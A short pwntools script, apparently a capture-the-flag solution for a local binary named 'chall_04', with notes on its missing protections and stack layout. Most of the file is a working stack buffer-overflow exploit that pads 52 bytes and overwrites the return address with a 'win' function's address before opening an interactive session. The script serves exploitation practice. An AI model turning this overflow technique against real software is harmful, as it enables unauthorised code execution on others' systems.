'''
Flaws: No PIE, no canary
Security: NX enabled

No stack canary, assume BOF, however no need to smash the stack with this one. 
No PIE, easy ROP.

var_40h = BP - 40h = 87b0 - 40h:db

87b0 SP
87b0 BP

89f0 BP

89f8 rip 400627
'''

from pwn import *


p = process("./chall_04")
l1 = b"Something in here"
p.sendline(l1)

win = 0x004005b7

offset = 52
l2 = b"A" * offset + b"oESP" + p64(win)
p.sendline(l2)
p.interactive()
